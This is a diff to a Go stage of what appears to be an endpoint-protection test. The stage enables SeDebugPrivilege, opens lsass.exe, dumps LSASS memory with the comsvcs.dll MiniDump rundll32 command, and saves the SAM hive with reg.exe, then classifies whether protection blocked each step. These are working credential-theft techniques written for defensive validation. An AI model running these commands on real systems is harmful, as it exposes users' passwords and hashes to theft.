@@ -7,10 +7,14 @@
 // MiniDump is the LockBit-documented LOLBin dump pattern).
 //
 // This stage:
-//   1. T1003.001 — locates lsass.exe via Toolhelp32 snapshot, then ATTEMPTS
-//      OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION). The access
-//      EVENT is the detection signal (Sysmon EID 10 / DeviceEvents). It then
-//      attempts the LockBit-documented LOLBin dump:
+//   1. T1003.001 — enables SeDebugPrivilege (real dumper tradecraft — and the
+//      precondition that makes an OpenProcess denial MEANINGFUL evidence:
+//      without it, Windows denies the lsass handle as baseline privilege-model
+//      behavior, not a protection action). Then locates lsass.exe via
+//      Toolhelp32 snapshot, ATTEMPTS OpenProcess(PROCESS_VM_READ |
+//      PROCESS_QUERY_INFORMATION) — the access EVENT is the detection signal
+//      (Sysmon EID 10 / DeviceEvents) — and attempts the LockBit-documented
+//      LOLBin dump:
 //         rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> <LOG_DIR>\lsass.dmp full
 //      Classification combines the handle result + dump file existence
 //      (os.Stat after a short sleep). NO manual ReadProcessMemory, NO
@@ -24,12 +28,14 @@
 //      read SAM), NOT a protection action, so it is never counted as a block
 //      (Rule 8). sam.save is DELETED in cleanup.
 //
-// Denial evidence is only counted when running elevated (admin/SYSTEM), where
-// these operations normally succeed — matching Rule 8's "operation that
-// normally succeeds in this context returning an OS-emitted denial".
+// Denial evidence is only counted when running elevated (admin/SYSTEM) AND
+// the relevant privilege was successfully enabled — matching Rule 8's
+// "operation that normally succeeds in this context returning an OS-emitted
+// denial".
 //
 // EXIT CODES: 0 = at least one credential-access primitive executed unimpeded,
-// 126 = both sub-techniques positively prevented, 999 = prerequisite error.
+// 126 = at least one sub-technique positively prevented (with the other not
+// successful), 999 = prerequisite error or fully inconclusive.
 
 //go:build windows
 // +build windows
@@ -78,7 +84,10 @@ const (
 	outcomeSuccess
 )
 
-var elevatedContext bool
+var (
+	elevatedContext bool
+	seDebugEnabled  bool
+)
 
 func main() {
 	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
@@ -87,6 +96,19 @@ func main() {
 
 	elevatedContext = isAdmin() || isSystemContext()
 	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Execution context: elevated=%v system=%v", elevatedContext, isSystemContext()))
+
+	// T1003.001 tradecraft: real dumpers enable SeDebugPrivilege before touching
+	// lsass. Only with the privilege enabled does a later OS denial count as
+	// positive protection evidence (Rule 8) — otherwise the denial is the
+	// baseline privilege model and must be treated as inconclusive.
+	seDebugEnabled = false
+	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
+		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("SeDebugPrivilege enable returned: %v - LSASS handle denial will be treated as inconclusive", err))
+		fmt.Printf("[STAGE %s] SeDebugPrivilege not available: %v\n", TECHNIQUE_ID, err)
+	} else {
+		seDebugEnabled = true
+		LogMessage("INFO", TECHNIQUE_ID, "SeDebugPrivilege enabled for LSASS access primitive")
+	}
 
 	dumpPath := filepath.Join(LOG_DIR, "lsass.dmp")
 	samPath := filepath.Join(LOG_DIR, "sam.save")
@@ -116,11 +138,11 @@ func main() {
 		fmt.Printf("[STAGE %s] Credential-access primitive executed without prevention\n", TECHNIQUE_ID)
 		LogMessage("SUCCESS", TECHNIQUE_ID, "At least one credential-access sub-technique executed unimpeded")
 		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Credential access primitive unprotected")
-	case lsassOutcome == outcomeBlocked && samOutcome == outcomeBlocked:
+	case lsassOutcome == outcomeBlocked || samOutcome == outcomeBlocked:
 		exitCode = StageBlocked
-		fmt.Printf("[STAGE %s] Both credential-access sub-techniques prevented\n", TECHNIQUE_ID)
-		LogMessage("BLOCKED", TECHNIQUE_ID, "LSASS and SAM access both positively prevented")
-		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "LSASS handle/dump and SAM save both prevented (positive evidence)")
+		fmt.Printf("[STAGE %s] Credential-access positively prevented (LSASS=%v SAM=%v)\n", TECHNIQUE_ID, lsassOutcome, samOutcome)
+		LogMessage("BLOCKED", TECHNIQUE_ID, "At least one credential-access sub-technique positively prevented")
+		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Credential access positively prevented (see sub-technique evidence)")
 	default:
 		exitCode = StageError
 		fmt.Printf("[STAGE %s] Stage error - prerequisites not met or inconclusive\n", TECHNIQUE_ID)
@@ -152,18 +174,22 @@ func attemptLSASSAccess(dumpPath string) subOutcome {
 	if hErr != nil {
 		denial := containsAnyStr(strings.ToLower(hErr.Error()),
 			[]string{"access is denied", "access denied"})
-		if denial && elevatedContext {
-			// As SYSTEM/admin this OpenProcess normally succeeds — an OS denial
-			// is positive evidence a protection layer acted (PPL/EDR/CredGuard).
+		if denial && elevatedContext && seDebugEnabled {
+			// With SeDebugPrivilege enabled, this OpenProcess normally succeeds
+			// as admin/SYSTEM — an OS denial is positive evidence a protection
+			// layer acted (PPL/EDR/CredGuard).
 			handleDenied = true
-			LogMessage("WARN", "T1003.001", fmt.Sprintf("lsass handle open returned OS denial in elevated context: %v", hErr))
+			LogMessage("WARN", "T1003.001", fmt.Sprintf("lsass handle open returned OS denial in elevated+SeDebug context: %v", hErr))
+			fmt.Printf("[STAGE %s] LSASS handle open DENIED with SeDebugPrivilege enabled - protection evidence\n", TECHNIQUE_ID)
 		} else {
 			LogMessage("WARNING", "T1003.001", fmt.Sprintf("lsass handle open failed (not attributable to protection in this context): %v", hErr))
+			fmt.Printf("[STAGE %s] LSASS handle open failed (inconclusive in this context): %v\n", TECHNIQUE_ID, hErr)
 		}
 	} else {
 		handleGranted = true
 		windows.CloseHandle(handle)
 		LogMessage("WARN", "T1003.001", fmt.Sprintf("Acquired PROCESS_VM_READ handle to %s (PID %d) - handle closed immediately", lsassImageName, pid))
+		fmt.Printf("[STAGE %s] Acquired PROCESS_VM_READ handle to lsass (PID %d)\n", TECHNIQUE_ID, pid)
 	}
 
 	// LockBit-documented LOLBin dump attempt (comsvcs.dll MiniDump). Runs
@@ -187,6 +213,7 @@ func attemptLSASSAccess(dumpPath string) subOutcome {
 	if fi, statErr := os.Stat(dumpPath); statErr == nil && fi.Size() > 0 {
 		dumpProduced = true
 		LogMessage("CRITICAL", "T1003.001", fmt.Sprintf("LSASS dump file produced (%d bytes) - credential dumping unimpeded", fi.Size()))
+		fmt.Printf("[STAGE %s] LSASS dump produced (%d bytes) - UNIMPEDED\n", TECHNIQUE_ID, fi.Size())
 	}
 
 	switch {
@@ -206,11 +233,18 @@ func attemptLSASSAccess(dumpPath string) subOutcome {
 		return outcomeBlocked
 	}
 	// No handle, no dump, no positive denial evidence.
+	if outStr != "" {
+		LogMessage("INFO", "T1003.001", fmt.Sprintf("rundll32 output (inconclusive): %s", outStr))
+	}
+	if runErr != nil {
+		LogMessage("INFO", "T1003.001", fmt.Sprintf("rundll32 exit status (inconclusive): %v", runErr))
+	}
 	return outcomeError
 }
 
 // attemptSAMAccess performs the T1003.002 SAM hive extraction attempt.
 func attemptSAMAccess(samPath string) subOutcome {
+	fmt.Printf("[STAGE %s] Attempting reg.exe save HKLM\\SAM (T1003.002)\n", TECHNIQUE_ID)
 	LogMessage("WARN", "T1003.002", "Attempting reg.exe save HKLM\\SAM (requires SeBackupPrivilege)")
 
 	cmd := exec.Command("reg.exe", "save", `HKLM\SAM`, samPath)
@@ -223,6 +257,7 @@ func attemptSAMAccess(samPath string) subOutcome {
 	if fi, statErr := os.Stat(samPath); statErr == nil && fi.Size() > 0 {
 		samProduced = true
 		LogMessage("CRITICAL", "T1003.002", fmt.Sprintf("SAM hive saved to disk (%d bytes) - unimpeded", fi.Size()))
+		fmt.Printf("[STAGE %s] SAM hive saved (%d bytes) - UNIMPEDED\n", TECHNIQUE_ID, fi.Size())
 	}
 	if samProduced {
 		return outcomeSuccess
@@ -249,11 +284,39 @@ func attemptSAMAccess(samPath string) subOutcome {
 	outLower := strings.ToLower(outStr + " " + errString(runErr))
 	if elevatedContext && containsAnyStr(outLower, []string{"access is denied", "access denied", "denied"}) {
 		LogMessage("WARN", "T1003.002", fmt.Sprintf("reg.exe save returned OS denial in elevated context: %s", outStr))
+		fmt.Printf("[STAGE %s] reg.exe save HKLM\\SAM DENIED in elevated context - protection evidence\n", TECHNIQUE_ID)
 		return outcomeBlocked
 	}
 
 	LogMessage("WARNING", "T1003.002", fmt.Sprintf("reg.exe save did not produce a file (err=%v out=%s) - not attributable to protection", runErr, outStr))
+	fmt.Printf("[STAGE %s] reg.exe save produced no file (err=%v out=%q) - inconclusive\n", TECHNIQUE_ID, runErr, outStr)
 	return outcomeError
+}
+
+// enablePrivilege enables the named privilege (e.g. SeDebugPrivilege) on the
+// current process token — standard credential-dumper tradecraft.
+func enablePrivilege(name string) error {
+	var token windows.Token
+	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
+		return fmt.Errorf("OpenProcessToken returned: %v", err)
+	}
+	defer token.Close()
+
+	var luid windows.LUID
+	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(name), &luid); err != nil {
+		return fmt.Errorf("LookupPrivilegeValue(%s) returned: %v", name, err)
+	}
+
+	tp := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
+		},
+	}
+	if err := windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil); err != nil {
+		return fmt.Errorf("AdjustTokenPrivileges returned: %v", err)
+	}
+	return nil
 }
 
 // findProcessByName walks a Toolhelp32 process snapshot and returns the PID of
